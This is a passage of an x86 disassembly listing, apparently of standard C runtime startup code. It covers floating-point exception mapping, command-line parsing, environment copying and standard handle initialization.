  422da4:	lea    eax,[ebp-0x10c]
  422daa:	push   eax
  422dab:	call   0x423e70
  422db0:	mov    edi,eax
  422db2:	lea    eax,[ebp-0x10c]
  422db8:	sub    eax,0x3b
  422dbb:	push   0x3
  422dbd:	add    edi,eax
  422dbf:	push   0x428480
  422dc4:	push   edi
  422dc5:	call   0x423d40
  422dca:	add    esp,0x10
  422dcd:	push   edi
  422dce:	call   0x423e70
  422dd3:	push   DWORD PTR [esi+0x45c1cc]
  422dd9:	mov    ebx,eax
  422ddb:	call   0x423e70
  422de0:	lea    eax,[ebx+eax*1+0x1c]
  422de4:	pop    ecx
  422de5:	add    eax,0x3
  422de8:	pop    ecx
  422de9:	and    eax,0xfffffffc
  422dec:	call   0x4238b0
  422df1:	mov    ebx,esp
  422df3:	push   0x428464
  422df8:	push   ebx
  422df9:	call   0x423c40
  422dfe:	push   edi
  422dff:	push   ebx
  422e00:	call   0x423c50
  422e05:	push   0x428460
  422e0a:	push   ebx
  422e0b:	call   0x423c50
  422e10:	push   DWORD PTR [esi+0x45c1cc]
  422e16:	push   ebx
  422e17:	call   0x423c50
  422e1c:	push   0x12010
  422e21:	push   0x428438
  422e26:	push   ebx
  422e27:	call   0x423b42
  422e2c:	add    esp,0x2c
  422e2f:	jmp    0x422e56
  422e31:	push   edx
  422e32:	lea    eax,[ebp+0x8]
  422e35:	push   eax
  422e36:	lea    esi,[esi+0x45c1cc]
  422e3c:	push   DWORD PTR [esi]
  422e3e:	call   0x423e70
  422e43:	pop    ecx
  422e44:	push   eax
  422e45:	push   DWORD PTR [esi]
  422e47:	push   0xfffffff4
  422e49:	call   DWORD PTR ds:0x428038
  422e4f:	push   eax
  422e50:	call   DWORD PTR ds:0x428034
  422e56:	lea    esp,[ebp-0x118]
  422e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  422e5f:	xor    ecx,DWORD PTR [ebp+0x4]
  422e62:	call   0x423f2c
  422e67:	pop    edi
  422e68:	pop    esi
  422e69:	pop    ebx
  422e6a:	leave  
  422e6b:	ret    
  422e6c:	mov    eax,ds:0x45cabc
  422e71:	cmp    eax,0x1
  422e74:	je     0x422e83
  422e76:	test   eax,eax
  422e78:	jne    0x422ea4
  422e7a:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422e81:	jne    0x422ea4
  422e83:	push   0xfc
  422e88:	call   0x422cf5
  422e8d:	mov    eax,ds:0x45cb08
  422e92:	test   eax,eax
  422e94:	pop    ecx
  422e95:	je     0x422e99
  422e97:	call   eax
  422e99:	push   0xff
  422e9e:	call   0x422cf5
  422ea3:	pop    ecx
  422ea4:	ret    
  422ea5:	push   ebp
  422ea6:	mov    ebp,esp
  422ea8:	push   ecx
  422ea9:	push   ebx
  422eaa:	push   esi
  422eab:	push   edi
  422eac:	call   0x42370d
  422eb1:	mov    edi,DWORD PTR [ebp+0x8]
  422eb4:	mov    esi,eax
  422eb6:	mov    edx,DWORD PTR [esi+0x54]
  422eb9:	mov    eax,ds:0x45c2dc
  422ebe:	mov    ecx,edx
  422ec0:	cmp    DWORD PTR [ecx],edi
  422ec2:	je     0x422ed1
  422ec4:	lea    ebx,[eax+eax*2]
  422ec7:	add    ecx,0xc
  422eca:	lea    ebx,[edx+ebx*4]
  422ecd:	cmp    ecx,ebx
  422ecf:	jb     0x422ec0
  422ed1:	lea    eax,[eax+eax*2]
  422ed4:	lea    eax,[edx+eax*4]
  422ed7:	cmp    ecx,eax
  422ed9:	jae    0x422edf
  422edb:	cmp    DWORD PTR [ecx],edi
  422edd:	je     0x422ee1
  422edf:	xor    ecx,ecx
  422ee1:	test   ecx,ecx
  422ee3:	je     0x422ffb
  422ee9:	mov    ebx,DWORD PTR [ecx+0x8]
  422eec:	test   ebx,ebx
  422eee:	mov    DWORD PTR [ebp+0x8],ebx
  422ef1:	je     0x422ffb
  422ef7:	cmp    ebx,0x5
  422efa:	jne    0x422f08
  422efc:	and    DWORD PTR [ecx+0x8],0x0
  422f00:	xor    eax,eax
  422f02:	inc    eax
  422f03:	jmp    0x423004
  422f08:	cmp    ebx,0x1
  422f0b:	je     0x422ff6
  422f11:	mov    eax,DWORD PTR [esi+0x58]
  422f14:	mov    DWORD PTR [ebp-0x4],eax
  422f17:	mov    eax,DWORD PTR [ebp+0xc]
  422f1a:	mov    DWORD PTR [esi+0x58],eax
  422f1d:	mov    eax,DWORD PTR [ecx+0x4]
  422f20:	cmp    eax,0x8
  422f23:	jne    0x422fe8
  422f29:	mov    edx,DWORD PTR ds:0x45c2d0
  422f2f:	mov    eax,ds:0x45c2d4
  422f34:	add    eax,edx
  422f36:	cmp    edx,eax
  422f38:	jge    0x422f61
  422f3a:	lea    eax,[edx+edx*2]
  422f3d:	shl    eax,0x2
  422f40:	mov    edi,DWORD PTR [esi+0x54]
  422f43:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f48:	mov    edi,DWORD PTR ds:0x45c2d0
  422f4e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422f54:	inc    edx
  422f55:	add    ebx,edi
  422f57:	add    eax,0xc
  422f5a:	cmp    edx,ebx
  422f5c:	jl     0x422f40
  422f5e:	mov    ebx,DWORD PTR [ebp+0x8]
  422f61:	mov    ecx,DWORD PTR [ecx]
  422f63:	cmp    ecx,0xc000008e
  422f69:	mov    edi,DWORD PTR [esi+0x5c]
  422f6c:	jne    0x422f77
  422f6e:	mov    DWORD PTR [esi+0x5c],0x83
  422f75:	jmp    0x422fdb
  422f77:	cmp    ecx,0xc0000090
  422f7d:	jne    0x422f88
  422f7f:	mov    DWORD PTR [esi+0x5c],0x81
  422f86:	jmp    0x422fdb
  422f88:	cmp    ecx,0xc0000091
  422f8e:	jne    0x422f99
  422f90:	mov    DWORD PTR [esi+0x5c],0x84
  422f97:	jmp    0x422fdb
  422f99:	cmp    ecx,0xc0000093
  422f9f:	jne    0x422faa
  422fa1:	mov    DWORD PTR [esi+0x5c],0x85
  422fa8:	jmp    0x422fdb
  422faa:	cmp    ecx,0xc000008d
  422fb0:	jne    0x422fbb
  422fb2:	mov    DWORD PTR [esi+0x5c],0x82
  422fb9:	jmp    0x422fdb
  422fbb:	cmp    ecx,0xc000008f
  422fc1:	jne    0x422fcc
  422fc3:	mov    DWORD PTR [esi+0x5c],0x86
  422fca:	jmp    0x422fdb
  422fcc:	cmp    ecx,0xc0000092
  422fd2:	jne    0x422fdb
  422fd4:	mov    DWORD PTR [esi+0x5c],0x8a
  422fdb:	push   DWORD PTR [esi+0x5c]
  422fde:	push   0x8
  422fe0:	call   ebx
  422fe2:	pop    ecx
  422fe3:	mov    DWORD PTR [esi+0x5c],edi
  422fe6:	jmp    0x422fef
  422fe8:	and    DWORD PTR [ecx+0x8],0x0
  422fec:	push   eax
  422fed:	call   ebx
  422fef:	mov    eax,DWORD PTR [ebp-0x4]
  422ff2:	pop    ecx
  422ff3:	mov    DWORD PTR [esi+0x58],eax
  422ff6:	or     eax,0xffffffff
  422ff9:	jmp    0x423004
  422ffb:	push   DWORD PTR [ebp+0xc]
  422ffe:	call   DWORD PTR ds:0x428040
  423004:	pop    edi
  423005:	pop    esi
  423006:	pop    ebx
  423007:	leave  
  423008:	ret    
  423009:	cmp    DWORD PTR ds:0x45d26c,0x0
  423010:	jne    0x423017
  423012:	call   0x42444c
  423017:	push   esi
  423018:	mov    esi,DWORD PTR ds:0x45d274
  42301e:	test   esi,esi
  423020:	jne    0x423029
  423022:	mov    esi,0x42849b
  423027:	jmp    0x42306e
  423029:	mov    al,BYTE PTR [esi]
  42302b:	cmp    al,0x22
  42302d:	jne    0x423057
  42302f:	inc    esi
  423030:	mov    al,BYTE PTR [esi]
  423032:	cmp    al,0x22
  423034:	je     0x423067
  423036:	test   al,al
  423038:	je     0x423050
  42303a:	movzx  eax,al
  42303d:	push   eax
  42303e:	call   0x423f6b
  423043:	test   eax,eax
  423045:	pop    ecx
  423046:	je     0x423049
  423048:	inc    esi
  423049:	inc    esi
  42304a:	mov    al,BYTE PTR [esi]
  42304c:	cmp    al,0x22
  42304e:	jne    0x423036
  423050:	cmp    BYTE PTR [esi],0x22
  423053:	jne    0x423068
  423055:	jmp    0x423067
  423057:	cmp    al,0x20
  423059:	jbe    0x423068
  42305b:	inc    esi
  42305c:	cmp    BYTE PTR [esi],0x20
  42305f:	ja     0x42305b
  423061:	jmp    0x423068
  423063:	cmp    al,0x20
  423065:	ja     0x42306e
  423067:	inc    esi
  423068:	mov    al,BYTE PTR [esi]
  42306a:	test   al,al
  42306c:	jne    0x423063
  42306e:	mov    eax,esi
  423070:	pop    esi
  423071:	ret    
  423072:	push   ebx
  423073:	xor    ebx,ebx
  423075:	cmp    DWORD PTR ds:0x45d26c,ebx
  42307b:	push   esi
  42307c:	push   edi
  42307d:	jne    0x423084
  42307f:	call   0x42444c
  423084:	mov    esi,DWORD PTR ds:0x45cab4
  42308a:	xor    edi,edi
  42308c:	cmp    esi,ebx
  42308e:	jne    0x4230a2
  423090:	jmp    0x4230c2
  423092:	cmp    al,0x3d
  423094:	je     0x423097
  423096:	inc    edi
  423097:	push   esi
  423098:	call   0x423e70
  42309d:	pop    ecx
  42309e:	lea    esi,[esi+eax*1+0x1]
  4230a2:	mov    al,BYTE PTR [esi]
  4230a4:	cmp    al,bl
  4230a6:	jne    0x423092
  4230a8:	lea    eax,[edi*4+0x4]
  4230af:	push   eax
  4230b0:	call   0x424582
  4230b5:	mov    edi,eax
  4230b7:	cmp    edi,ebx
  4230b9:	pop    ecx
  4230ba:	mov    DWORD PTR ds:0x45cae4,edi
  4230c0:	jne    0x4230c7
  4230c2:	or     eax,0xffffffff
  4230c5:	jmp    0x42311f
  4230c7:	mov    esi,DWORD PTR ds:0x45cab4
  4230cd:	push   ebp
  4230ce:	jmp    0x4230fa
  4230d0:	push   esi
  4230d1:	call   0x423e70
  4230d6:	mov    ebp,eax
  4230d8:	inc    ebp
  4230d9:	cmp    BYTE PTR [esi],0x3d
  4230dc:	pop    ecx
  4230dd:	je     0x4230f8
  4230df:	push   ebp
  4230e0:	call   0x424582
  4230e5:	cmp    eax,ebx
  4230e7:	pop    ecx
  4230e8:	mov    DWORD PTR [edi],eax
  4230ea:	je     0x423123
  4230ec:	push   esi
  4230ed:	push   eax
  4230ee:	call   0x423c40
  4230f3:	pop    ecx
  4230f4:	pop    ecx
  4230f5:	add    edi,0x4
  4230f8:	add    esi,ebp
  4230fa:	cmp    BYTE PTR [esi],bl
  4230fc:	jne    0x4230d0
  4230fe:	push   DWORD PTR ds:0x45cab4
  423104:	call   0x42446a
  423109:	mov    DWORD PTR ds:0x45cab4,ebx
  42310f:	mov    DWORD PTR [edi],ebx
  423111:	mov    DWORD PTR ds:0x45d260,0x1
  42311b:	xor    eax,eax
  42311d:	pop    ecx
  42311e:	pop    ebp
  42311f:	pop    edi
  423120:	pop    esi
  423121:	pop    ebx
  423122:	ret    
  423123:	push   DWORD PTR ds:0x45cae4
  423129:	call   0x42446a
  42312e:	mov    DWORD PTR ds:0x45cae4,ebx
  423134:	or     eax,0xffffffff
  423137:	jmp    0x42311d
  423139:	push   ebp
  42313a:	mov    ebp,esp
  42313c:	push   ecx
  42313d:	push   ebx
  42313e:	mov    ebx,DWORD PTR [ebp+0xc]
  423141:	xor    edx,edx
  423143:	cmp    DWORD PTR [ebp+0x8],edx
  423146:	push   edi
  423147:	mov    DWORD PTR [esi],edx
  423149:	mov    edi,ecx
  42314b:	mov    DWORD PTR [ebx],0x1
  423151:	je     0x42315c
  423153:	mov    ecx,DWORD PTR [ebp+0x8]
  423156:	add    DWORD PTR [ebp+0x8],0x4
  42315a:	mov    DWORD PTR [ecx],edi
  42315c:	cmp    BYTE PTR [eax],0x22
  42315f:	jne    0x42316f
  423161:	xor    ecx,ecx
  423163:	test   edx,edx
  423165:	sete   cl
  423168:	inc    eax
  423169:	mov    edx,ecx
  42316b:	mov    cl,0x22
  42316d:	jmp    0x42319c
  42316f:	inc    DWORD PTR [esi]
  423171:	test   edi,edi
  423173:	je     0x42317a
  423175:	mov    cl,BYTE PTR [eax]
  423177:	mov    BYTE PTR [edi],cl
  423179:	inc    edi
  42317a:	mov    cl,BYTE PTR [eax]
  42317c:	movzx  ebx,cl
  42317f:	inc    eax
  423180:	test   BYTE PTR [ebx+0x45cf21],0x4
  423187:	je     0x423195
  423189:	inc    DWORD PTR [esi]
  42318b:	test   edi,edi
  42318d:	je     0x423194
  42318f:	mov    bl,BYTE PTR [eax]
  423191:	mov    BYTE PTR [edi],bl
  423193:	inc    edi
  423194:	inc    eax
  423195:	test   cl,cl
  423197:	mov    ebx,DWORD PTR [ebp+0xc]
  42319a:	je     0x4231ce
  42319c:	test   edx,edx
  42319e:	jne    0x42315c
  4231a0:	cmp    cl,0x20
  4231a3:	je     0x4231aa
  4231a5:	cmp    cl,0x9
  4231a8:	jne    0x42315c
  4231aa:	test   edi,edi
  4231ac:	je     0x4231b2
  4231ae:	and    BYTE PTR [edi-0x1],0x0
  4231b2:	and    DWORD PTR [ebp-0x4],0x0
  4231b6:	cmp    BYTE PTR [eax],0x0
  4231b9:	je     0x423295
  4231bf:	mov    cl,BYTE PTR [eax]
  4231c1:	cmp    cl,0x20
  4231c4:	je     0x4231cb
  4231c6:	cmp    cl,0x9
  4231c9:	jne    0x4231d1
  4231cb:	inc    eax
  4231cc:	jmp    0x4231bf
  4231ce:	dec    eax
  4231cf:	jmp    0x4231b2
  4231d1:	cmp    BYTE PTR [eax],0x0
  4231d4:	je     0x423295
  4231da:	cmp    DWORD PTR [ebp+0x8],0x0
  4231de:	je     0x4231e9
  4231e0:	mov    ecx,DWORD PTR [ebp+0x8]
  4231e3:	add    DWORD PTR [ebp+0x8],0x4
  4231e7:	mov    DWORD PTR [ecx],edi
  4231e9:	inc    DWORD PTR [ebx]
  4231eb:	xor    ebx,ebx
  4231ed:	inc    ebx
  4231ee:	xor    edx,edx
  4231f0:	jmp    0x4231f4
  4231f2:	inc    eax
  4231f3:	inc    edx
  4231f4:	cmp    BYTE PTR [eax],0x5c
  4231f7:	je     0x4231f2
  4231f9:	cmp    BYTE PTR [eax],0x22
  4231fc:	jne    0x423224
  4231fe:	test   dl,0x1
  423201:	jne    0x423222
  423203:	cmp    DWORD PTR [ebp-0x4],0x0
  423207:	je     0x423215
  423209:	lea    ecx,[eax+0x1]
  42320c:	cmp    BYTE PTR [ecx],0x22
  42320f:	jne    0x423215
  423211:	mov    eax,ecx
  423213:	jmp    0x423217
  423215:	xor    ebx,ebx
  423217:	xor    ecx,ecx
  423219:	cmp    DWORD PTR [ebp-0x4],ecx
  42321c:	sete   cl
  42321f:	mov    DWORD PTR [ebp-0x4],ecx
  423222:	shr    edx,1
  423224:	test   edx,edx
  423226:	je     0x423235
  423228:	test   edi,edi
  42322a:	je     0x423230
  42322c:	mov    BYTE PTR [edi],0x5c
  42322f:	inc    edi
  423230:	inc    DWORD PTR [esi]
  423232:	dec    edx
  423233:	jne    0x423228
  423235:	mov    cl,BYTE PTR [eax]
  423237:	test   cl,cl
  423239:	je     0x423283
  42323b:	cmp    DWORD PTR [ebp-0x4],0x0
  42323f:	jne    0x42324b
  423241:	cmp    cl,0x20
  423244:	je     0x423283
  423246:	cmp    cl,0x9
  423249:	je     0x423283
  42324b:	test   ebx,ebx
  42324d:	je     0x42327d
  42324f:	test   edi,edi
  423251:	je     0x42326c
  423253:	movzx  edx,cl
  423256:	test   BYTE PTR [edx+0x45cf21],0x4
  42325d:	je     0x423265
  42325f:	mov    BYTE PTR [edi],cl
  423261:	inc    edi
  423262:	inc    eax
  423263:	inc    DWORD PTR [esi]
  423265:	mov    cl,BYTE PTR [eax]
  423267:	mov    BYTE PTR [edi],cl
  423269:	inc    edi
  42326a:	jmp    0x42327b
  42326c:	movzx  ecx,cl
  42326f:	test   BYTE PTR [ecx+0x45cf21],0x4
  423276:	je     0x42327b
  423278:	inc    eax
  423279:	inc    DWORD PTR [esi]
  42327b:	inc    DWORD PTR [esi]
  42327d:	inc    eax
  42327e:	jmp    0x4231eb
  423283:	test   edi,edi
  423285:	je     0x42328b
  423287:	and    BYTE PTR [edi],0x0
  42328a:	inc    edi
  42328b:	inc    DWORD PTR [esi]
  42328d:	mov    ebx,DWORD PTR [ebp+0xc]
  423290:	jmp    0x4231b6
  423295:	mov    eax,DWORD PTR [ebp+0x8]
  423298:	test   eax,eax
  42329a:	je     0x42329f
  42329c:	and    DWORD PTR [eax],0x0
  42329f:	inc    DWORD PTR [ebx]
  4232a1:	pop    edi
  4232a2:	pop    ebx
  4232a3:	leave  
  4232a4:	ret    
  4232a5:	push   ebp
  4232a6:	mov    ebp,esp
  4232a8:	push   ecx
  4232a9:	push   ecx
  4232aa:	push   ebx
  4232ab:	push   esi
  4232ac:	push   edi
  4232ad:	xor    edi,edi
  4232af:	cmp    DWORD PTR ds:0x45d26c,edi
  4232b5:	jne    0x4232bc
  4232b7:	call   0x42444c
  4232bc:	and    BYTE PTR ds:0x45cc14,0x0
  4232c3:	push   0x104
  4232c8:	mov    esi,0x45cb10
  4232cd:	push   esi
  4232ce:	push   edi
  4232cf:	call   DWORD PTR ds:0x42803c
  4232d5:	mov    eax,ds:0x45d274
  4232da:	cmp    eax,edi
  4232dc:	mov    DWORD PTR ds:0x45caf4,esi
  4232e2:	je     0x4232eb
  4232e4:	cmp    BYTE PTR [eax],0x0
  4232e7:	mov    ebx,eax
  4232e9:	jne    0x4232ed
  4232eb:	mov    ebx,esi
  4232ed:	lea    eax,[ebp-0x4]
  4232f0:	push   eax
  4232f1:	push   edi
  4232f2:	lea    esi,[ebp-0x8]
  4232f5:	xor    ecx,ecx
  4232f7:	mov    eax,ebx
  4232f9:	call   0x423139
  4232fe:	mov    esi,DWORD PTR [ebp-0x4]
  423301:	mov    eax,DWORD PTR [ebp-0x8]
  423304:	shl    esi,0x2
  423307:	add    eax,esi
  423309:	push   eax
  42330a:	call   0x424582
  42330f:	mov    edi,eax
  423311:	add    esp,0xc
  423314:	test   edi,edi
  423316:	jne    0x42331d
  423318:	or     eax,0xffffffff
  42331b:	jmp    0x423342
  42331d:	lea    eax,[ebp-0x4]
  423320:	push   eax
  423321:	lea    ecx,[esi+edi*1]
  423324:	push   edi
  423325:	lea    esi,[ebp-0x8]
  423328:	mov    eax,ebx
  42332a:	call   0x423139
  42332f:	mov    eax,DWORD PTR [ebp-0x4]
  423332:	dec    eax
  423333:	pop    ecx
  423334:	mov    ds:0x45cad8,eax
  423339:	pop    ecx
  42333a:	mov    DWORD PTR ds:0x45cadc,edi
  423340:	xor    eax,eax
  423342:	pop    edi
  423343:	pop    esi
  423344:	pop    ebx
  423345:	leave  
  423346:	ret    
  423347:	push   ecx
  423348:	push   ecx
  423349:	mov    eax,ds:0x45cc18
  42334e:	push   ebx
  42334f:	push   ebp
  423350:	push   esi
  423351:	push   edi
  423352:	mov    edi,DWORD PTR ds:0x428054
  423358:	xor    ebx,ebx
  42335a:	xor    esi,esi
  42335c:	cmp    eax,ebx
  42335e:	push   0x2
  423360:	pop    ebp
  423361:	jne    0x423390
  423363:	call   edi
  423365:	mov    esi,eax
  423367:	cmp    esi,ebx
  423369:	je     0x423377
  42336b:	mov    DWORD PTR ds:0x45cc18,0x1
  423375:	jmp    0x423395
  423377:	call   DWORD PTR ds:0x428010
  42337d:	cmp    eax,0x78
  423380:	jne    0x42338b
  423382:	mov    eax,ebp
  423384:	mov    ds:0x45cc18,eax
  423389:	jmp    0x423390
  42338b:	mov    eax,ds:0x45cc18
  423390:	cmp    eax,0x1
  423393:	jne    0x423412
  423395:	cmp    esi,ebx
  423397:	jne    0x4233a1
  423399:	call   edi
  42339b:	mov    esi,eax
  42339d:	cmp    esi,ebx
  42339f:	je     0x42341a
  4233a1:	cmp    WORD PTR [esi],bx
  4233a4:	mov    eax,esi
  4233a6:	je     0x4233b6
  4233a8:	add    eax,ebp
  4233aa:	cmp    WORD PTR [eax],bx
  4233ad:	jne    0x4233a8
  4233af:	add    eax,ebp
  4233b1:	cmp    WORD PTR [eax],bx
  4233b4:	jne    0x4233a8
  4233b6:	mov    edi,DWORD PTR ds:0x428050
  4233bc:	push   ebx
  4233bd:	push   ebx
  4233be:	push   ebx
  4233bf:	sub    eax,esi
  4233c1:	push   ebx
  4233c2:	sar    eax,1
  4233c4:	inc    eax
  4233c5:	push   eax
  4233c6:	push   esi
  4233c7:	push   ebx
  4233c8:	push   ebx
  4233c9:	mov    DWORD PTR [esp+0x34],eax
  4233cd:	call   edi
  4233cf:	mov    ebp,eax
  4233d1:	cmp    ebp,ebx
  4233d3:	je     0x423407
  4233d5:	push   ebp
  4233d6:	call   0x424582
  4233db:	cmp    eax,ebx
  4233dd:	pop    ecx
  4233de:	mov    DWORD PTR [esp+0x10],eax
  4233e2:	je     0x423407
  4233e4:	push   ebx
  4233e5:	push   ebx
  4233e6:	push   ebp
  4233e7:	push   eax
  4233e8:	push   DWORD PTR [esp+0x24]
  4233ec:	push   esi
  4233ed:	push   ebx
  4233ee:	push   ebx
  4233ef:	call   edi
  4233f1:	test   eax,eax
  4233f3:	jne    0x423403
  4233f5:	push   DWORD PTR [esp+0x10]
  4233f9:	call   0x42446a
  4233fe:	pop    ecx
  4233ff:	mov    DWORD PTR [esp+0x10],ebx
  423403:	mov    ebx,DWORD PTR [esp+0x10]
  423407:	push   esi
  423408:	call   DWORD PTR ds:0x42804c
  42340e:	mov    eax,ebx
  423410:	jmp    0x423462
  423412:	cmp    eax,ebp
  423414:	je     0x42341e
  423416:	cmp    eax,ebx
  423418:	je     0x42341e
  42341a:	xor    eax,eax
  42341c:	jmp    0x423462
  42341e:	call   DWORD PTR ds:0x428048
  423424:	mov    esi,eax
  423426:	cmp    esi,ebx
  423428:	je     0x42341a
  42342a:	cmp    BYTE PTR [esi],bl
  42342c:	je     0x423438
  42342e:	inc    eax
  42342f:	cmp    BYTE PTR [eax],bl
  423431:	jne    0x42342e
  423433:	inc    eax
  423434:	cmp    BYTE PTR [eax],bl
  423436:	jne    0x42342e
  423438:	sub    eax,esi
  42343a:	inc    eax
  42343b:	mov    ebp,eax
  42343d:	push   ebp
  42343e:	call   0x424582
  423443:	mov    edi,eax
  423445:	cmp    edi,ebx
  423447:	pop    ecx
  423448:	jne    0x42344e
  42344a:	xor    edi,edi
  42344c:	jmp    0x423459
  42344e:	push   ebp
  42344f:	push   esi
  423450:	push   edi
  423451:	call   0x4245a0
  423456:	add    esp,0xc
  423459:	push   esi
  42345a:	call   DWORD PTR ds:0x428044
  423460:	mov    eax,edi
  423462:	pop    edi
  423463:	pop    esi
  423464:	pop    ebp
  423465:	pop    ebx
  423466:	pop    ecx
  423467:	pop    ecx
  423468:	ret    
  423469:	sub    esp,0x48
  42346c:	push   ebx
  42346d:	mov    ebx,0x480
  423472:	push   ebx
  423473:	call   0x424582
  423478:	test   eax,eax
  42347a:	pop    ecx
  42347b:	jne    0x423485
  42347d:	or     eax,0xffffffff
  423480:	jmp    0x423662
  423485:	mov    ds:0x45d160,eax
  42348a:	mov    DWORD PTR ds:0x45d148,0x20
  423494:	lea    ecx,[eax+0x480]
  42349a:	jmp    0x4234ba
  42349c:	and    BYTE PTR [eax+0x4],0x0
  4234a0:	or     DWORD PTR [eax],0xffffffff
  4234a3:	and    DWORD PTR [eax+0x8],0x0
  4234a7:	mov    BYTE PTR [eax+0x5],0xa
  4234ab:	mov    ecx,DWORD PTR ds:0x45d160
  4234b1:	add    eax,0x24
  4234b4:	add    ecx,0x480
  4234ba:	cmp    eax,ecx
  4234bc:	jb     0x42349c
  4234be:	push   ebp
  4234bf:	push   esi
  4234c0:	push   edi
  4234c1:	lea    eax,[esp+0x14]
  4234c5:	push   eax
  4234c6:	call   DWORD PTR ds:0x42801c
  4234cc:	cmp    WORD PTR [esp+0x46],0x0
  4234d2:	je     0x4235c1
  4234d8:	mov    eax,DWORD PTR [esp+0x48]
  4234dc:	test   eax,eax
  4234de:	je     0x4235c1
  4234e4:	mov    edi,DWORD PTR [eax]
  4234e6:	lea    ebp,[eax+0x4]
  4234e9:	lea    eax,[edi+ebp*1]
  4234ec:	mov    DWORD PTR [esp+0x10],eax
  4234f0:	mov    eax,0x800
  4234f5:	cmp    edi,eax
  4234f7:	jl     0x4234fb
  4234f9:	mov    edi,eax
  4234fb:	cmp    DWORD PTR ds:0x45d148,edi
  423501:	jge    0x423551
  423503:	mov    esi,0x45d164
  423508:	push   ebx
  423509:	call   0x424582
  42350e:	test   eax,eax
  423510:	pop    ecx
  423511:	je     0x42354b
  423513:	add    DWORD PTR ds:0x45d148,0x20
  42351a:	mov    DWORD PTR [esi],eax
  42351c:	lea    ecx,[eax+0x480]
  423522:	jmp    0x42353a
  423524:	and    BYTE PTR [eax+0x4],0x0
  423528:	or     DWORD PTR [eax],0xffffffff
  42352b:	and    DWORD PTR [eax+0x8],0x0
  42352f:	mov    BYTE PTR [eax+0x5],0xa
  423533:	mov    ecx,DWORD PTR [esi]
  423535:	add    eax,0x24
  423538:	add    ecx,ebx
  42353a:	cmp    eax,ecx
  42353c:	jb     0x423524
  42353e:	add    esi,0x4
  423541:	cmp    DWORD PTR ds:0x45d148,edi
  423547:	jl     0x423508
  423549:	jmp    0x423551
  42354b:	mov    edi,DWORD PTR ds:0x45d148
  423551:	xor    ebx,ebx
  423553:	test   edi,edi
  423555:	jle    0x4235c1
  423557:	mov    eax,DWORD PTR [esp+0x10]
  42355b:	mov    eax,DWORD PTR [eax]
  42355d:	cmp    eax,0xffffffff
  423560:	je     0x4235b6
  423562:	mov    cl,BYTE PTR [ebp+0x0]
  423565:	test   cl,0x1
  423568:	je     0x4235b6
  42356a:	test   cl,0x8
  42356d:	jne    0x42357a
  42356f:	push   eax
  423570:	call   DWORD PTR ds:0x42805c
  423576:	test   eax,eax
  423578:	je     0x4235b6
  42357a:	mov    ecx,ebx
  42357c:	mov    eax,ebx
  42357e:	and    eax,0x1f
  423581:	lea    eax,[eax+eax*8]
  423584:	sar    ecx,0x5
  423587:	mov    ecx,DWORD PTR [ecx*4+0x45d160]
  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
